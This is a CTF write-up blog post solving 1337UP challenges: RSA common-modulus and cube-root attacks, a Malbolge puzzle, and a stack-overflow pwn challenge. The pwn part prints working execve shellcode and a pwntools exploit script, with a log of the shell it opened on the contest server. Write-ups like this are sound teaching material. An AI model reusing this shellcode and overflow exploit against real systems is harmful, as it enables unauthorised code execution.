# Table of Contents

- [Table of Contents](#table-of-contents)
- [About the CTF](#about-the-ctf)
- [My solves in this CTF](#my-solves-in-this-ctf)
- [Crypto challenges](#crypto-challenges)
  - [Equality](#equality)
    - [Equality solve script](#equality-solve-script)
  - [Dante's Inferno](#dantes-inferno)
    - [Dante's Inferno Solve script](#dantes-inferno-solve-script)
  - [Warmup Encoder](#warmup-encoder)
    - [Understanding the encryption](#understanding-the-encryption)
    - [Solve approach](#solve-approach)
- [Pwn Challenges](#pwn-challenges)
  - [Easy Register](#easy-register)
    - [Static analysis w/ Ghidra](#static-analysis-w-ghidra)
    - [Dynamic analysis - GDB](#dynamic-analysis---gdb)
    - [Popping a shell](#popping-a-shell)
    - [Easy register pwn script](#easy-register-pwn-script)

# About the CTF

133UP CTF was the first CTF hosted by Intigrity as a precursor to the online conference. This CTF was a team of 4 based Jeopardy style event.

# My solves in this CTF

I was able to solve just 4 challenges(three during the event and one just as the event ended). Can't say much about all the challenges cos I attempted only 7 of 'em.

This post will contain my writeups for all the three challenges. (I might include writeups for challenges I solved with the help of writeups too)

# Crypto challenges

## Equality

**Challenge description**: The department of bad and dangerous files has received this bad and dangerous file. All our leading experts are unable to figure out what to do with this. Perhaps you can give them a hand?

Downloadable file: **equality.txt**

```
{’n’ = ‘0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875’, ‘e’ = ‘0x3045’, ‘ct’ = ‘0x5d1e39bc751108ec0a1397d79e63c013d238915d13380ae649e84d7d85ebcffbbc35ebb18d2218ccbc5409290dfa8a4847e5923c3420e83b1a9d7aa67190dc0d34711cce261665c64c28ed2834394d4b181926febf7eb685f9ce81f36c7fb72798da3a14a123287171d26e084948aab0fba81c53f10b5696fc291006254ee690’}

{’n’ = ‘0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875’, ‘e’ = ‘0xff4d’, ‘ct’ = ‘0x3d90f2bec4fe02d8ce4cece3ddb6baed99337f7e6856eef255445741b5cfe378390f058679d70236e51be4746db4c207f274c40b092e24f8c155a0957867e84dca48e27980af488d2615a280c6eadec2f1d30b95653b1ee3135e2edff100dd2c529994f846722f811348b082d0bec7cfab579a4bd0ab789928b1bebed68d628f’}
```

Right off the bat we can notice that `n` value is the same for both cases. So it is a **RSA Common Modulus Attack**.
If you wish to learn more about the attack: 

1. [Cryptohack](https://cryptohack.gitbook.io/cryptobook/untitled/common-modulus-attack)
2. [Infosecwriteups](https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5)

### Equality solve script

Used a script from previous challenge I had solved and just updated the values:

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

class RSAModuli:
    def __init__(self):
       self.a = 0
       self.b = 0
       self.m = 0
       self.i = 0
    def gcd(self, num1, num2):
       """
       This function os used to find the GCD of 2 numbers.
       :param num1:
       :param num2:
       :return:
       """
       if num1 < num2:
           num1, num2 = num2, num1
       while num2 != 0:
           num1, num2 = num2, num1 % num2
       return num1
    def extended_euclidean(self, e1, e2):
       """
       The value a is the modular multiplicative inverse of e1 and e2.
       b is calculated from the eqn: (e1*a) + (e2*b) = gcd(e1, e2)
       :param e1: exponent 1
       :param e2: exponent 2
       """
       self.a = gmpy2.invert(e1, e2)
       self.b = (float(self.gcd(e1, e2)-(self.a*e1)))/float(e2)
   
    def modular_inverse(self, c1, c2, N):
       """
       i is the modular multiplicative inverse of c2 and N.
       i^-b is equal to c2^b. So if the value of b is -ve, we
       have to find out i and then do i^-b.
       Final plain text is given by m = (c1^a) * (i^-b) %N
       :param c1: cipher text 1
       :param c2: cipher text 2
       :param N: Modulus
       """
       i = gmpy2.invert(c2, N)
       mx = pow(c1, self.a, N)
       my = pow(i, int(-self.b), N)
       self.m= mx * my % N
    
    def print_value(self):
        print("Plain Text: ", self.m)
		print("Decoded: {}".format(long_to_bytes(self.m) ))


def main():
   c = RSAModuli()
   N  = 0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875
   c1 = 0x5d1e39bc751108ec0a1397d79e63c013d238915d13380ae649e84d7d85ebcffbbc35ebb18d2218ccbc5409290dfa8a4847e5923c3420e83b1a9d7aa67190dc0d34711cce261665c64c28ed2834394d4b181926febf7eb685f9ce81f36c7fb72798da3a14a123287171d26e084948aab0fba81c53f10b5696fc291006254ee690
   c2 = 0x3d90f2bec4fe02d8ce4cece3ddb6baed99337f7e6856eef255445741b5cfe378390f058679d70236e51be4746db4c207f274c40b092e24f8c155a0957867e84dca48e27980af488d2615a280c6eadec2f1d30b95653b1ee3135e2edff100dd2c529994f846722f811348b082d0bec7cfab579a4bd0ab789928b1bebed68d628f
   e1 = 0x3045
   e2 = 0xff4d
   c.extended_euclidean(e1, e2)
   c.modular_inverse(c1, c2, N)
   c.print_value()

if __name__ == '__main__':
   main()
```

**Output:**

```
Plain Text:  115548295651062957451755301487730858595531541142049034896216257855631374758492509209936649431552922879423180413
Decoded: b'1337UP{c0mm0n_m0dulu5_4774ck_15_n07_50_c0mm0n}'
```

Flag: **1337UP{c0mm0n_m0dulu5_4774ck_15_n07_50_c0mm0n}**

---

## Dante's Inferno

**Challenge description:** The department of bad and dangerous files has received this bad and dangerous file. All our leading experts are unable to figure out what to do with this. Perhaps you can give them a hand?

Downloadable file: _unknow_

Using `file` Linux command shows that it is a zip file:

```bash
file unknown
unknown: Zip archive data, made by v?[0x314], extract using at least v2.0, last modified Tue Oct 14 16:34:33 2014, uncompressed size 1742, method=deflate
```

The file's magic bytes are messed up so we need to use hexedit to fix the first few bytes to `50 4B 03 04`

Then we can unzip the file which gives us _flag_

```
Hey there, it's Ben I forgot the key to unlock my omnitrix help me to decrypt the key.

This was the data Azmuth found in the ROOT of omnitrix :

D'`r_"\!65|{8yTBu-,P0<L']m7)iE3ffT"b~=+<)([wvo5Vlqping-kjihgfH%cb[`Y}@VUyxXQPUTMLpPOHMFj-,HGF?>bBA:?>7[;:9870v.3,PO/.'K%*)"F&%ed"y~w=uzsr8potml21oQmf,diha`e^$\aZ_^W{[=<XWPOs65KPIHGFjJIHG@?c=B;@?>7[;4981U5.R21q)M-&%I#('~D${"y?wv{t:9qYun4rkSonmlkdihg`&d]\aZY}@V[ZYXQuU76LKo2HGFjiCHA@?c=B;@?>7[;4981UT4321q)M'&%$)"!E%e{z@~}_uzs9wvotsrk1onPle+*)a`e^$\aZY}W\[TSwvVUTMLpPIHGLEiIHG@(>baA:^!~<;:921U54t2+*N.'&%*)"FEfe{"y?>v{zsxqp6nVl2pohg-ejib('_^]b[Z~^@?UZSRvPONr54JImGLKDIBfe(>=<`#">=65Y987w/43,P0)o-,+$H('&%|B"!~w|{t:xZpo5Vlqjinmled*Ka`edc\"Z_^]Vz=YXQPtN6LKoO10FKDhHAF?cCBA#"8\65Y987w/43,P*p.-&J*#i'&}C#"!x>|{zyr8ponmrqj0/mfNjibg`_^$b[Z_X]VUySRQPUNr54JImMLEDhHA@dD=B;:^8=6;4X2Vwv4-,+*N(-,%$H(!&}C#"!xwv<zyxZpo5Vrkjongf,jibJ`_^$\aZ_^]VzTYRWVOsSRQJn1MFKJCBf)(>=<`#"8\654XW165.-Q10)('K+$#G'&fe#"y?}vuzyxq7utsrkj0hgfkjihg`_^$\[ZY}|V[ZSRWPtT6LKJIm0/KDIHAeEDC<;:9]\6Z4z816/4-,P0/.'&%$H('&%ed"y~w={tsr8vo5mlqponmf,diba`ed]#"Z_X]V[TxRQVONMLp3INGFEi,HAF?c=<;@9876Z{921U/432+O)o'&%I#(!&%${A@~}|{ts9qpun4lkpi/glkdcba'_dcbaZY}]\UyS;QVUNrq4JIHMFj-,BGF?cCBA#"8=6Z:98705.-Q1*p.-&JI#"!~}C{"!~}v<tsrqp6Wsl2jinmlkdcba'e^cb[Z~^@?UZSRv98TSLKo2NMFEJIBf)EDC<;_98=6;4X2765.-Q10)o'&%I#i'&}C{"y~w=utyrqp6tsrqSi/g-ediha'eG]#[ZY}@VzTYXWVOs6LKo2NMFKJCBf@ED=a;@9]=<54XW765.-Q1q)ML,%*)"!~}C{"yx}v<;yrwvo5slqpohg-kdchgf_%]\[Z~}@VzZYRWVOsSRQJnN0/EDCg*)E>b<;@?8=6Z:9810T4t2+*N(-,%$H('gf|Bz!x}|u;srqpon4lTjohg-kjiba'e^c\"!Y^]\[TxXW9ONMLpPOHMFjDIHA@E>b<;:9]=6;492V65.R2+*N.'&+*#G'~%|#"yx>=uzsxwvun43kjohgf,jihgfe^$\[Z_^W{[TYXWVOsSRQJONMLEiCHG@?cb%;@?8\6;492VUTu-2+ONon,+*#G!&}C#"!x>|u;yrwpun4lTjohg-eMib(fe^cb[!Y^]\Uy<;WVONSLpJIHMFKDhU
```

Based on the hint: _Dante's Inferno_ (and the name "ben") we find the esolang - [**Malboge**](https://en.wikipedia.org/wiki/Malbolge). We use the the [Malbolge compiler](https://malbolge.doleczek.pl/) to run the code. And we get the output

```
ct =  873155658033286165345893055075219953448439133304998599826332294122364399613515391492517530741997313686269671365469457117326837553092248386584401016236110628510070270063568461732767950347057143066788600143225698168693961311821925168117751654884111332051719013
```

This part had me confused for a long time as I didnt know how to decipher this. After a long time I figured out why _ROOT_ was emphasized in the flag file. It was hint to find **RSA Cube Root attack**.

Links to know more about this attack:
 - [bi0s.in - Cube root attack](https://wiki.bi0s.in/crypto/rsa-cube-root-attack/)
 - [Crypto StackExchange explaination](https://crypto.stackexchange.com/questions/33561/cube-root-attack-rsa-with-low-exponent)

Now that we know the attack method, all we need to do is compute the cube root of the given cipher text and then convert it to bytes

### Dante's Inferno Solve script

```python
#!/bin/python3
from gmpy2 import iroot,to_binary

ct =  873155658033286165345893055075219953448439133304998599826332294122364399613515391492517530741997313686269671365469457117326837553092248386584401016236110628510070270063568461732767950347057143066788600143225698168693961311821925168117751654884111332051719013

res = iroot(ct,3)
flag = to_binary(res[0]).decode()
flag = flag[::-1]

print(f"Flag: {flag}")
```

And as output we get the flag: **1337UP{U_d3CrYPt3D_th3_k3Y_30494762}**

----



----

# Pwn Challenges

## Easy Register

**Challenge description:** Registers are easy!

This challenge was a real basic pwn challenge.

Starting off with basic checks:

`file` op:

```bash
easy_register: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ba448db2793d54d5ef48046ff85490b3b875831c, for GNU/Linux 3.2.0, not stripped
```

`checksec` op:

```bash
Arch:     amd64-64-little 
RELRO:    Full RELRO      
Stack:    No canary found 
NX:       NX disabled     
PIE:      PIE enabled     
RWX:      Has RWX segments
```

test execution:

```bash
./easy_register
  _ _______________ _   _ ____
 / |___ /___ /___  | | | |  _ \
 | | |_ \ |_ \  / /| | | | |_) |
 | |___) |__) |/ / | |_| |  __/
 |_|____/____//_/   \___/|_|

[i] Initialized attendee listing at 0x7ffff91000f0.
[i] Starting registration application.

Hacker name > fast

[+] Registration completed. Enjoy!
[+] Exiting.
```

### Static analysis w/ Ghidra

`easy_register()` function is our vulnerable function. It has buffer of size 80 bytes whose input is got via `gets()`.

**source code:**

```c
void easy_register(void)

{
  char VulnBuffer [80];
  
  printf("[\x1b[34mi\x1b[0m] Initialized attendee listing at %p.\n",VulnBuffer);
  puts("[\x1b[34mi\x1b[0m] Starting registration application.\n");
  printf("Hacker name > ");
  gets(VulnBuffer);
  puts("\n[\x1b[32m+\x1b[0m] Registration completed. Enjoy!");
  puts("[\x1b[32m+\x1b[0m] Exiting.");
  return;
}
```

### Dynamic analysis - GDB

To find the offset lets use `cyclic(100)` from pwntools and pass it to the binary through GDB. The program crashes and we can see that the RBP has the values `vaaa` which is at an offset of 84 bytes(found using `cyclic_find('vaaa')`). Therefore the **offset to RIP is 88 bytes**

### Popping a shell

Since `NX` - NonExecutable is disabled we can get shellcode to run on the stack! Going with this shellcode which can be got through shellstorm

```
\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05
```

### Easy register pwn script

```python
#!/bin/python2
from pwn import *

exe = "./easy_register"

elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

# Setup process
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


p = start()
p.recvuntil("listing at")
leak = int(((p.recvline()).strip()).strip('.'), 16)
info("Leaked address: {}".format(hex(leak)))

eip_offset = 88
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
info("Length of shellcode: {}".format(len(shellcode)))
padding1 = "0" * (eip_offset - len(shellcode))

payload = flat(
    shellcode,
    padding1,
    p64(leak),
    )
info("Length of payload: {}".format(len(payload)))

with open('payload', 'wb') as f:
    f.write(payload)

p.recvuntil("Hacker name > ")
p.sendline(payload)
p.interactive()
```

**Output:**

```bash
root@f506b482cbb4:/pwn/ctf# python2 solve.py REMOTE easyregister.ctf.intigriti.io 7777
[+] Opening connection to easyregister.ctf.intigriti.io on port 7777: Done
[*] Leaked address: 0x7ffc06948040
[*] Length of shellcode: 24
[*] Length of payload: 96
[*] Switching to interactive mode

[+] Registration completed. Enjoy!
[+] Exiting.
$ ls
bin
dev
easy_register
etc
flag
lib
lib64
usr
$ cat flag
1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}
```

Flag: **1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}**

---

